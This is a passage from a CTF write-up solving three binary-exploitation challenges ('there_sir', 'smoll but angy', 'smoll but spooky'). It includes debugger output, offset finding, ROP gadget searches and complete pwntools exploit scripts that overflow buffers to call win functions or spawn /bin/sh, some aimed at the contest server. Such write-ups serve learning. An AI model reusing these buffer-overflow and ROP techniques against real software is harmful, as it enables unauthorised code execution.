   0x0000000000401357 <+12>:    mov    DWORD PTR [rbp-0x4],edi
   0x000000000040135a <+15>:    mov    QWORD PTR [rbp-0x10],rsi
   0x000000000040135e <+19>:    mov    eax,0x0
   0x0000000000401363 <+24>:    call   0x401237 <initialize>
   0x0000000000401368 <+29>:    mov    eax,0x0
   0x000000000040136d <+34>:    call   0x4012e5 <vuln>
   0x0000000000401372 <+39>:    mov    eax,0x0
   0x0000000000401377 <+44>:    leave
   0x0000000000401378 <+45>:    ret
End of assembler dump.
pwndbg> b *main+45
Breakpoint 1 at 0x401378
pwndbg> cyclic 100
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
pwndbg> r
Starting program: /home/benkyou/Dev/bbctf/there_sir/chall 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib64/libthread_db.so.1".
Enter something: AAA
Enter message: aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
...[SNIP]...
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────────────────────────
 RAX  0x65
 RBX  0x7fffffffd948 —▸ 0x7fffffffdd88 ◂— '/home/benkyou/Dev/bbctf/there_sir/chall'
 RCX  0x7ffff7e99811 (read+17) ◂— cmp rax, -0x1000 /* 'H=' */
 RDX  0x400
 RDI  0
 RSI  0x7fffffffd7c0 ◂— 0x6161616161616161 ('aaaaaaaa')
 R8   0x7fffffffd750 ◂— 0
 R9   0x7ffff7fca1a0 (_dl_fini) ◂— endbr64 
 R10  0
 R11  0x246
 R12  1
 R13  0
 R14  0x7ffff7ffd000 (_rtld_local) —▸ 0x7ffff7ffe2f0 ◂— 0
 R15  0x403e18 (__do_global_dtors_aux_fini_array_entry) —▸ 0x4011e0 (__do_global_dtors_aux) ◂— endbr64 
 RBP  0x6161616161616169 ('iaaaaaaa')
 RSP  0x7fffffffd808 ◂— 0x616161616161616a ('jaaaaaaa')
 RIP  0x40134a (vuln+101) ◂— ret 
...[SNIP]...
pwndbg> cyclic -l jaaaaaaa
Finding cyclic pattern of 8 bytes: b'jaaaaaaa' (hex: 0x6a61616161616161)
Found at offset 72
```

To pass the expected parameters to `win`, we'll need  `pop rdi` and `pop rsi` gadgets.

Our `pop rdi` gadget is at `0x401381`.
```
(ctfvenv) benkyou@fedora:~/Dev/bbctf/there_sir$ ROPgadget --binary ./chall | grep rdi
0x0000000000401381 : pop rdi ; ret
```

Our `pop rsi` gadget is at `0x401383`.
```
(ctfvenv) benkyou@fedora:~/Dev/bbctf/there_sir$ ROPgadget --binary ./chall  | grep rsi
0x0000000000401383 : pop rsi ; ret
```

Because the version of libc was never given for this challenge, we can't find the address of "/bin/sh" to store in `rsi`.
~~I did try guessing multiple common versions of libc, but didn't work :D~~

Instead, we need to write "/bin/sh" to a writable memory section in the program, and point its address to `rsi`.
To do this, we'll need to use the `read` gadget in the program to write to the memory section.

To find writable sections, you can use `objdump -h`.
```
root@a4026eb3f513:/ctf# objdump -h ./chall
./chall:     file format elf64-x86-64

Sections:
Idx Name          Size      VMA               LMA               File off  Algn
...[SNIP]...
 19 .init_array   00000008  0000000000403e10  0000000000403e10  00002e10  2**3
                  CONTENTS, ALLOC, LOAD, DATA
 20 .fini_array   00000008  0000000000403e18  0000000000403e18  00002e18  2**3
                  CONTENTS, ALLOC, LOAD, DATA
 21 .dynamic      000001d0  0000000000403e20  0000000000403e20  00002e20  2**3
                  CONTENTS, ALLOC, LOAD, DATA
 22 .got          00000010  0000000000403ff0  0000000000403ff0  00002ff0  2**3
                  CONTENTS, ALLOC, LOAD, DATA
 23 .got.plt      00000058  0000000000404000  0000000000404000  00003000  2**3
                  CONTENTS, ALLOC, LOAD, DATA
 24 .data         00000010  0000000000404058  0000000000404058  00003058  2**3
                  CONTENTS, ALLOC, LOAD, DATA
 25 .bss          00000030  0000000000404070  0000000000404070  00003068  2**4
                  ALLOC
 26 .comment      0000002b  0000000000000000  0000000000000000  00003068  2**0
```

We have a couple of options to choose from here, I'll write "/bin/sh" to `.data`.

The exploit:
```python
from pwn import *

elf = ELF("./chall")
# p = remote("157.180.92.15", 39124)
p = elf.process()
context.binary = elf
# context.log_level = "debug"

p.sendlineafter(b"Enter something: ", b"AAAA")

data = 0x404058
pop_rdi = p64(0x401381)
pop_rsi = p64(0x401383)
pop_rdx = p64(0x401385)
read_plt = elf.plt["read"]
ret = p64(0x40101a) 
win = elf.symbols["win"]
offset = 72

rop = ROP(elf)
rop.call('read', [0, data, 8]) # /bin/sh\x00 is 8 bytes 
rop.raw(pop_rdi)
rop.raw(0x539)
rop.raw(pop_rsi)
rop.raw(data)
rop.raw(win)

payload = flat({
	offset: rop.chain()
	})

p.sendlineafter(b"Enter message: ",payload)
p.sendline(b"/bin/sh\x00")

p.interactive()
```

Flag: bbctf{pointerpointstoapoint}

### smoll but angy (Pwn)

> The seas be vast, but even the smallest squall can sink the mightiest ship. A pirate's fury be swift, and only the cleverest scallywag can slip past his wrath. Ye best be minding where ye step, or he'll send ye straight to Davy Jones’ locker!
>
> **Author: OS1R1S**

This is a ret2win challenge that doesn't actually use stack canaries :p

It's a 32-bit challenge, something to keep in mind when dealing with calling conventions.
```
(ctfvenv) benkyou@fedora:~/Dev/bbctf/smolangy$ checksec *
[*] '/home/benkyou/Dev/bbctf/smolangy/smoll-but-angy'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
```

Protections are enabled except for PIE, so buffer overflow should be more difficult.

However, notice that if we try to send a long input to the program, it segfaults instead of the expected "stack smashing detected" error message.

```
root@d48544b50dc3:/ctf# python3 -c 'print("A"*200)' | ./smoll-but-angy 
You dare challenge me?
Very well, show me what you got!
Segmentation fault
```

This suggests that the program doesn't actually check the canary, even though it was compiled with `-fstack-protector`.
When we decompile the binary, we also don't see the expected `__stack_chk_fail` calls before the function returns.
This allows us to do ret2win with a standard buffer overflow.

Our win function is `treasure` which makes a system call to `cat flag`.

![](/assets/img/2025-05-11-blackbbery-ccoe-ctf-2025/angy_treasure.png)
_treasure()_

Find the offset for the buffer overflow:

```
...[SNIP]...
pwndbg> b *main+143
Breakpoint 1 at 0x8049a59
pwndbg> cyclic 200
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
pwndbg> r
...[SNIP]...
pwndbg> c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x6261616a in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────────────────────────
 EAX  0
 EBX  0x62616168 ('haab')
 ECX  0
 EDX  0x80e9774 (_IO_stdfile_1_lock) ◂— 0
 EDI  2
 ESI  0x80e7ff4 (_GLOBAL_OFFSET_TABLE_) ◂— 0
 EBP  0x62616169 ('iaab')
*ESP  0xffffca10 ◂— 'kaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n'
*EIP  0x6261616a ('jaab')
...[SNIP]...
pwndbg> cyclic -l jaab
Finding cyclic pattern of 4 bytes: b'jaab' (hex: 0x6a616162)
Found at offset 136
```

The exploit:
```python
from pwn import *

elf = ELF("./smoll-but-angy")
# p = elf.process()
p = remote("157.180.92.15", 41432)
context.binary = elf
# context.log_level = "debug"

offset = 136
payload = flat({
	offset: elf.symbols["treasure"]
	})

p.sendline(payload)
p.interactive()
```

Flag: bbctf{1_L1k3_wh4t_yO0U_90t_93fe215}

### smoll but spooky (Pwn)

> The legend speaks of a ghostly vessel doomed to sail the seas forever, its captain bound by a fate worse than death. Those who dare cross its path must break free before they, too, become part of the crew. The echoes of the past hold the bash. Follow them right, and ye might just escape the cursed grip of the Flying Dutchman.
> 
> **Author: OS1R1S**

This is another ret2win challenge with function parameters.

Binary protections:
```
(ctfvenv) benkyou@fedora:~/Dev/bbctf/smolspooky$ checksec *
[*] '/home/benkyou/Dev/bbctf/smolspooky/smoll-but-spooky'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

No protections :D

The program is vulnerable to buffer overflow.
```
root@d514c19eb5eb:/ctf# python3 -c 'print("A"*100)' | ./smoll-but-spooky 
Is it that spooky?Welcome to Blackberry CTF 2025, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!
Segmentation fault
```

However, this challenge had some sort of anti-debugging(?) so I couldnt' step through the program.

I played around with different lengths, and eventually found the offset at 24.

If we look at the symbols in the binary, `system` is somewhere in the program, and binsh is stored in `.data`.
```
root@d514c19eb5eb:/ctf# nm ./smoll-but-spooky 
...[SNIP]...
0000000000601048 D binsh
0000000000601050 b completed.7594
0000000000601038 W data_start
0000000000400510 t deregister_tm_clones
00000000004005b0 t frame_dummy
00000000004005d6 T main
                 U printf@@GLIBC_2.2.5
0000000000400550 t register_tm_clones
                 U system@@GLIBC_2.2.5
```

And binsh happens to store the string "/bin/sh".
```
root@d514c19eb5eb:/ctf# objdump -S ./smoll-but-spooky -M intel -sj .data
...[SNIP]...
0000000000601048 <binsh>:
  601048:       2f 62 69 6e 2f 73 68 00                             /bin/sh.
```

So, our goal for this challenge is to use the buffer overflow to pass binsh to `system`.

We'll need a `pop rdi` gadget to point `rdi` at the address of binsh.

```
root@d514c19eb5eb:/ctf# ROPgadget --binary ./smoll-but-spooky | grep 'pop rdi'
0x0000000000400683 : pop rdi ; ret
```

The exploit:
```python
from pwn import *

elf = ELF("./smoll-but-spooky")
# p = elf.process()
p = remote("157.180.92.15", 31316)
context.binary = elf
# context.log_level = "debug"

offset = 24
binsh = 0x601048
system = 0x400490
pop_rdi = 0x400683
ret = 0x400479

payload = flat({
	offset: [
		pop_rdi,
		binsh,
		ret,
		system
	]
})

p.sendline(payload)
p.interactive()
```

Flag: bbctf{w4sN7_SpooKy_A7_A11_3064a678}